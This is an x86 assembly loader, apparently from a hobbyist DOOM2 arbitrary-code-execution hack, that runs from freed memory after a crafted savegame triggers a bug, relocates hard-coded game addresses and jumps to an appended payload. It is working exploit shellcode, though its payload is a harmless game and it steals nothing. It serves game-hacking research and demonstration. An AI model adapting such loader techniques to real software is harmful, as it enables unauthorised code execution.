// kgsws' DOOM2 code execution
// - this code is running from memory block allocated but already freed by ZONE
// - this source only contains payload, you still need exploited savegame file
//
// %eax - address of savebuffer variable
// %edx - pointer to pspdef_t in player structure

#define TEXT_START	0x1000

.section .text
.globl _start

// Loaders purpose is
// - free everything it can
// - allocate memory for the code and copy it
// - allocate memory for .bss and clear it
// - run the code

_start:
	// backup everything needed
	push	%ebx
	push	%ecx
	push	%edx
	push	%esi
	push	%edi
	push	%ebp

	// get _start base
	mov	(%eax),%esi
	add	$(3322-TEXT_START),%esi	// ESI will always point to local base
	// get DATA base
	sub	$0x2B3C4,%eax
	push	%eax
	// get CODE base
	mov	28(%esp),%eax
	sub	$0x2D095,%eax

	// relocate CODE references
	mov	$reloc_code_start,%ebx
	mov	$((reloc_code_end-reloc_code_start)/4),%edx
	call	do_reloc

	// relocate DATA references
	pop	%eax
	mov	$reloc_data_start,%ebx
	mov	$((reloc_data_end-reloc_data_start)/4),%edx
	call	do_reloc

	// force title screen
	mov	gamestate(%esi),%eax
	movw	$3,(%eax)
	mov	wipegamestate(%esi),%eax
	movw	$-1,(%eax)
	call	*D_StartTitle(%esi)

	// stop music (to free the data)
	call	*S_StopMusic(%esi)

	// free everything not needed
	mov	$50,%eax	// from PU_LEVEL
	mov	$9999,%edx	// and everything else
	call	*Z_FreeTags(%esi)

	// allocate memory for payload and its .bss
	mov	payload_is_here(%esi),%eax
	add	-(3346-TEXT_START)(%esi),%eax // almost savegame size (this won't be used anyway)
	mov	$1,%edx	// PU_STATIC
	xor	%ebx,%ebx // NULL
	call	*Z_Malloc(%esi)

	// copy the payload
	push	%eax
	lea	payload_is_here(%esi),%ecx
	mov	-(3346-TEXT_START)(%esi),%ebx
	add	%eax,%ebx
copy_loop:
	mov	(%ecx),%edx
	mov	%edx,(%eax)
	add	$4,%ecx
	add	$4,%eax
	cmp	%ebx,%eax
	jl	copy_loop
	pop	%eax

	// pass relocation info
	mov	_code_base(%esi),%ebx
	mov	_data_base(%esi),%ecx

	// run the code
	add	$4,%eax
	jmp	*%eax

// relocate the section
// %eax - section base
// %ebx - reloc start
// %edx - reloc count
do_reloc: // TODO: rework; there is always one element
	add	%esi,%ebx
do_reloc_loop:
	test	%edx,%edx
	jz	do_reloc_end
	dec	%edx
	add	%eax,(%ebx)
	add	$4,%ebx
	jmp	do_reloc_loop
do_reloc_end:
	ret

//
// tables

// pointers to the CODE section
// everything here has to be called indirectly
reloc_code_start:
//
_code_base:
	.4byte	0
S_StopMusic:
	.4byte	0x0003EC40
D_StartTitle:
	.4byte	0x0001D810
Z_Malloc:
	.4byte	0x00039690
Z_FreeTags:
	.4byte	0x00039780
//
reloc_code_end:

// pointers to the DATA section
// everything here has to be addressed indirectly
reloc_data_start:
//
_data_base:
	.4byte	0
gamestate:
	.4byte	0x0002B3F4
wipegamestate:
	.4byte	0x00011B40
//
reloc_data_end:

payload_is_here:
// present at the end of loader
// this part is in compiled 'snake' binary
/*
	// .bss size
	.4byte	8
	// continue
	pop	%ebp
	pop	%edi
	pop	%esi
	pop	%edx
	pop	%ecx
	pop	%ebx
	ret
*/
